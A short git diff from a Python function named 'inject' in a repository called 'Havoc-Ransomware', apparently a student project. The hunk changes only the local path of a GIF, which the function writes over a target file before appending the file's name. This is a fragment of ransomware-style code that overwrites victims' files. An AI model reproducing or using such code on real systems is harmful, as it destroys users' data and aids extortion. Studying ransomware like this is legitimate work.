@@ -53,7 +53,7 @@ def inject(filename):
     with open(filename,'rb') as f_bytes:
         old_file = f_bytes.read()
     with open(filename,'wb') as f_bytes:
-        with open("G:/College/Sem6/CASS/Project/Havoc-Ransomware/fsoc.gif", 'rb') as fsoc:
+        with open("G:/College/Coding/Github repos/Havoc-Ransomeware/Havoc-Ransomware/giphy.gif", 'rb') as fsoc:
             f_bytes.write(fsoc.read())
             f_bytes.write(struct.pack('i', len(filename)))
             f_bytes.write(str(filename).encode())
